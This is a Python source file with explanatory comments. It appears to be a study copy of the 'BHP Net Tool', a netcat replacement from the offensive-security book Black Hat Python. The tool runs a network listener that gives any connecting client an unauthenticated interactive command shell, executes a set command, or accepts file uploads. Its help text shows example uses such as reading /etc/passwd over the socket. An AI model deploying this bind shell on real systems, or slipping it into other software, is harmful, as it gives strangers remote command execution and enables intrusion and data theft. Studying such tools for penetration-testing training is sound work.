import argparse
import socket
import shlex
import subprocess
import sys
import textwrap
import threading

class NetCat:
    def __init__(self, args, buffer=None):
        # ArgumentParser commands
        self.args = args
        # if upload 
        self.buffer = buffer
        #                               IPv4            TCP client
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def run(self):
        if self.args.listen:
            self.listen()
        else:
            self.send()

    """Function executed when setting up a client."""
    def send(self):
        # connect to the socket accessing the target/port vars in args
        self.socket.connect((self.args.target, self.args.port))
        # if buffer contains a file send the file
        if self.buffer:
            self.socket.send(self.buffer)
        # wait for returned messages
        try:
            while True:
                # retrieve data by counting its length up to 4096 bytes
                recv_len = 1
                # store response here
                response = ''
                while recv_len:
                    # capture response
                    data = self.socket.recv(4096)
                    # until the recieved data's len == 0 retrieve more
                    recv_len = len(data)
                    # add data to response
                    response += data.decode()
                    if recv_len < 4096:
                        break
                if response:
                    print(response)
                    buffer = input('> ')
                    buffer += '\n'
                    self.socket.send(buffer.encode())
        except KeyboardInterrupt:
            print('User terminated.')
            self.socket.close()
            sys.exit()

    """Function called when setting up a server."""
    def listen(self):
        self.socket.bind((self.args.target, self.args.port))
        # queue up to 5 requests
        self.socket.listen(5)
        while True:
            # Wait for an incoming connection. Return a new socket representing the connection,
            # and the address of the client. For IP sockets, the address info is a pair (hostaddr, port).
            client_socket, _ = self.socket.accept()
            client_thread = threading.Thread(target=self.handle, args=(client_socket,))
            client_thread.start()

    """Function called to handle the requests from the socket."""
    def handle(self, client_socket):
        # Execute will send a command through the socket
        if self.args.execute:
            output = execute(self.args.execute)
            client_socket.send(output.encode())

        # upload will send a file through the socket and write it to a file
        elif self.args.upload:
            file_buffer = b''
            while True:
                data = client_socket.recv(4096)
                if data:
                    file_buffer += data
                else:
                    break

                with open(self.args.upload, 'wb') as f:
                    f.write(file_buffer)
                message = f'Saved file {self.args.upload}'
                client_socket.send(message.encode())

        elif self.args.command:
            cmd_buffer = b''
            while True:
                try:
                    client_socket.send(b'BHP: #> ')
                    while '\n' not in cmd_buffer.decode():
                        cmd_buffer += client_socket.recv(64)
                    response = execute(cmd_buffer.decode())
                    if response:
                        client_socket.send(response.encode())
                    cmd_buffer = b''
                except Exception as e:
                    print(f'server killed {e}')
                    self.socket.close()
                    sys.exit()


def execute(cmd):
    # Remove spaces at the beginning and at the end of the string:
    cmd = cmd.strip()
    if not cmd:
        return
    # Run command with arguments and return its output, stderr=subprocess.STDOUT will catch standard errors
    output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
    # return the decoded data from the returned subprocess output
    return output.decode()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='BHP Net Tool',
        # Help message formatter which retains any formatting in descriptions.
        formatter_class=argparse.RawDescriptionHelpFormatter,
        # help command output
        epilog=textwrap.dedent('''Example:
            netcat.py -t 192.168.1.108 -p 5555 -l -c                        <--- command shell & listener setup
            netcat.py -t 192.168.1.108 -p 5555 -l -u = myupload.txt         <--- upload file & listener setup
            netcat.py -t 192.168.1.108 -p 5555 -l -e = \"cat /etc/passwd\"    <--- execute command & listener setup
            echo 'ABC' | ./netcat.py -t 192.168.1.108 -p 135                <--- echo local text to server port 135
            netcat.py -t 192.168.1.108 -p 5555                              <--- connect to server
        ''')) # we use 3 ' to maintain formatted commands in the help output
    #     add_argument(command choices,  assign true if called)
    # -c argument indicates an interactive shell will be set up
    parser.add_argument('-c', '--command', action='store_true', help='command shell')
    # -e argument indicates one command will be sent and output/response displayed
    parser.add_argument('-e', '--execute', help='execute specified command')
    # -l argument indicates that a listener should be set up
    parser.add_argument('-l', '--listen', action='store_true', help='listen')
    parser.add_argument('-p', '--port', type=int, default=5555, help='specified port')
    parser.add_argument('-t', '--target', default='192.168.1.203', help='specified IP')
    parser.add_argument('-u', '--upload', help='upload file')
    args = parser.parse_args()
    if args.listen:
        buffer = ''
    else:
        buffer = sys.stdin.read()

    nc = NetCat(args, buffer.encode())
    nc.run()